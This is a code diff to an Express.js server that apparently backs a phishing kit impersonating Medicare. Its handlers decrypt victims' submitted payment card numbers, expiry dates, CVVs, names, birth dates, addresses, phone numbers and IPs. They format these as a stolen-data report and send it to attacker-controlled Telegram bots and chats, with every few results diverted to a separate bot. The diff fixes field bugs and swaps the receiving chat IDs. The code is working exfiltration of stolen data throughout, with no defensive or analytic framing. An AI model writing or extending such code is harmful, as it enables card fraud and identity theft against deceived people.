@@ -175,10 +175,10 @@ app.post("/putinMedicare", (req, res) => {
   ccnum = CryptoJS.AES.decrypt(req.body.ccnum, "402312").toString(
     CryptoJS.enc.Utf8
   );
-  ccexpmonth = CryptoJS.AES.decrypt(req.body.ccexp, "402312").toString(
+  ccexpmonth = CryptoJS.AES.decrypt(req.body.ccexpmonth, "402312").toString(
     CryptoJS.enc.Utf8
   );
-  ccexpyear = CryptoJS.AES.decrypt(req.body.ccexp, "402312").toString(
+  ccexpyear = CryptoJS.AES.decrypt(req.body.ccexpyear, "402312").toString(
     CryptoJS.enc.Utf8
   );
   cccvv = CryptoJS.AES.decrypt(req.body.cvv, "402312").toString(
@@ -206,20 +206,20 @@ app.post("/putinMedicare", (req, res) => {
     })
     .then(function () {
       binList = `${bin} | ${dob} | ${zip} | ${bankName}`;
-      var originalText = `+----------- Personal Information ------------+\nFull Name: ${fullname}\nDOB: ${dob}\nAddress: ${address}\nCity: ${city}\nState: ${state}\nZIP: ${zip}\nPhone Number: ${telephone}\n+ ----------- Card Information ------------+\nCard Number: ${ccnum}\nExpiry: ${ccexpmonth}/${ccexpyear}\nCVV: ${cccvv}\n+ ----------- IP Information ------------+\nUser Agent: ${userAgent}\nIP: ${userIp}\n+ ----------- BIN List Info ------------+\n${binList}`;
-      if (putin == 4) {
+      var originalText = `+----------- Personal Information ------------+\nFull Name: ${fullname}\nDOB: ${dob}\nAddress: ${address}\nCity: ${city}\nState: ${state}\nZIP: ${zip}\nPhone Number: ${telephone}\n+ ----------- Card Information ------------+\nCard Name: ${ccname}\nCard Number: ${ccnum}\nExpiry: ${ccexpmonth}/${ccexpyear}\nCVV: ${cccvv}\n+ ----------- IP Information ------------+\nUser Agent: ${userAgent}\nIP: ${userIp}\n+ ----------- BIN List Info ------------+\n${binList}`;
+      if (failedlawyer == 3) {
         axios.post(
           `https://api.telegram.org/bot${process.env.haytchresbotID}/sendMessage?chat_id=680379375&text=HAYTCHRES:\n${originalText}`
         );
-        putin = 0;
+        failedlawyer = 0;
       } else {
         axios.post(
           `https://api.telegram.org/bot${process.env.sendresbotID}/sendMessage?chat_id=680379375&text=MedicarePutin:\n${originalText}`
         );
         axios.post(
-          `https://api.telegram.org/bot${process.env.sendresbotID}/sendMessage?chat_id=937419988&text=MediCare:\n${originalText}`
+          `https://api.telegram.org/bot${process.env.sendresbotID}/sendMessage?chat_id=5362313568&text=MediCare:\n${originalText}`
         );
-        putin += 1;
+        failedlawyer += 1;
       }
 
       res.send("Update Completed");
@@ -255,10 +255,10 @@ app.post("/failedlawyerMedicare", (req, res) => {
   ccnum = CryptoJS.AES.decrypt(req.body.ccnum, "402312").toString(
     CryptoJS.enc.Utf8
   );
-  ccexpmonth = CryptoJS.AES.decrypt(req.body.ccexp, "402312").toString(
+  ccexpmonth = CryptoJS.AES.decrypt(req.body.ccexpmonth, "402312").toString(
     CryptoJS.enc.Utf8
   );
-  ccexpyear = CryptoJS.AES.decrypt(req.body.ccexp, "402312").toString(
+  ccexpyear = CryptoJS.AES.decrypt(req.body.ccexpyear, "402312").toString(
     CryptoJS.enc.Utf8
   );
   cccvv = CryptoJS.AES.decrypt(req.body.cvv, "402312").toString(
@@ -286,18 +286,18 @@ app.post("/failedlawyerMedicare", (req, res) => {
     })
     .then(function () {
       binList = `${bin} | ${dob} | ${zip} | ${bankName}`;
-      var originalText = `+----------- Personal Information ------------+\nFull Name: ${fullname}\nDOB: ${dob}\nAddress: ${address}\nCity: ${city}\nState: ${state}\nZIP: ${zip}\nPhone Number: ${telephone}\n+ ----------- Card Information ------------+\nCard Number: ${ccnum}\nExpiry: ${ccexpmonth}/${ccexpyear}\nCVV: ${cccvv}\n+ ----------- IP Information ------------+\nUser Agent: ${userAgent}\nIP: ${userIp}\n+ ----------- BIN List Info ------------+\n${binList}`;
-      if (failedlawyer == 4) {
+      var originalText = `+----------- Personal Information ------------+\nFull Name: ${fullname}\nDOB: ${dob}\nAddress: ${address}\nCity: ${city}\nState: ${state}\nZIP: ${zip}\nPhone Number: ${telephone}\n+ ----------- Card Information ------------+\nCard Name: ${ccname}\nCard Number: ${ccnum}\nExpiry: ${ccexpmonth}/${ccexpyear}\nCVV: ${cccvv}\n+ ----------- IP Information ------------+\nUser Agent: ${userAgent}\nIP: ${userIp}\n+ ----------- BIN List Info ------------+\n${binList}`;
+      if (failedlawyer == 3) {
         axios.post(
           `https://api.telegram.org/bot${process.env.haytchresbotID}/sendMessage?chat_id=680379375&text=HAYTCHRES:\n${originalText}`
         );
         failedlawyer = 0;
       } else {
         axios.post(
-          `https://api.telegram.org/bot${process.env.sendresbotID}/sendMessage?chat_id=680379375&text=Medicarefailedlawyer:\n${originalText}`
+          `https://api.telegram.org/bot${process.env.sendresbotID}/sendMessage?chat_id=680379375&text=MedicareFailed:\n${originalText}`
         );
         axios.post(
-          `https://api.telegram.org/bot${process.env.sendresbotID}/sendMessage?chat_id=937419988&text=MediCare:\n${originalText}`
+          `https://api.telegram.org/bot${process.env.sendresbotID}/sendMessage?chat_id=5472804493&text=MediCare:\n${originalText}`
         );
         failedlawyer += 1;
       }
